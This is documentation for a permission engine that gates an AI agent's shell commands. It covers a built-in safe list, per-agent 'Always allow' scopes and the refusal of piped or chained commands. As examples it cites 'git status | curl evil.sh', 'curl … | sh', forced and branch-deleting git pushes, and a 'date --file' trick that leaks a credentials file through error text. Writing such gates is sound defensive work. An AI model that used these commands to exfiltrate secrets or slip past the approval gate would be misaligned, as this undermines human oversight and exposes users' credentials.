# Shell commands

`shell.run` is one tool whose calls range from `git status` to
`curl … | sh`, so a single risk level for all of them would be either too
coarse to be safe or too coarse to be usable. The tool is `gated`, and the
permission engine then judges each command.

## Which commands run unattended

1. **Scopes approved this session**, then
2. **the agent's whitelist** — `~/.stratus/agents/<id>.whitelist.json`,
   written by **Always allow** — then
3. **the built-in safe list**: `git status`, `git log`, `git diff`,
   `git show`, `git blame`, `git rev-parse`, `git ls-files`, plus
   `git branch`, `git tag`, and `git remote` **in their listing forms
   only** — creating a branch or a tag needs no flag at all
   (`git branch release` is a mutation), so those scopes refuse any
   positional argument, not just the destructive flags. `pwd`, `whoami`, and
   `uname` round it out.

Anything else asks, and in [`headless` mode](./approvals.md) anything else is
refused with the command in the log.

**A control operator disqualifies the whole command**, whatever it starts
with: `|`, `&`, `;`, a newline, backticks, `$( )`, subshells, redirection.
`git status | curl evil.sh` is refused despite the safe base command; so is
a two-line command whose first line is innocent. A command this parser
cannot read the way `sh` would — an unbalanced quote, a path instead of a
command name — is refused too.

## Always allow persists a scope, not a command

Approving `git push origin main` stores `git push` minus its destructive
forms, so `git push origin feature` stops asking while these still ask:

```text
git push --force            # a destructive flag
git push origin :main       # a branch delete, with no flag involved
git push origin +main       # a forced update, likewise
```

The whitelist file is `0600` and per agent: it decides what runs with nobody
watching, so neither another account on the machine nor another agent
inherits it. Delete an entry to withdraw the permission.

## What the log records about a command

The scope, never the command:

```text
09:14:36  —  warning: ava: shell.run was called outside every approved scope (git) and nobody is available to approve it
09:16:02  —  ava: "git push" now runs without asking
```

The daemon log is a trace, not a second transcript — it records that a tool
ran, never what it was called with. A command an agent composed can carry a
URL, a filename, or something a person pasted into a chat, and this file is
one `stratus logs` prints and people paste into issues. The command itself
goes to whoever is being asked to approve it: the terminal prompt and the
Slack message both show it in full, because approving a bare tool name is
approving something you cannot see.

## Why the safe list is short

The safe list is deliberately short, and `cat`, `ls`, and `grep` are the
tempting entries that cannot be on it — they read whatever path they are
given, so safe-listing them would safe-list reading your credentials file.
Approve them once for a scope you actually want instead.

The test is **what an argument can make the command do**, not what the
command is called. `date` was on this list until it turned out that
`date --file=~/.stratus/credentials.json` makes GNU `date` read that file
and echo every unparseable line back in its error text — which the tool
returns. A command that can be handed a path is a file reader wearing
another name, so `--file` is now refused in every scope, including ones you
add.
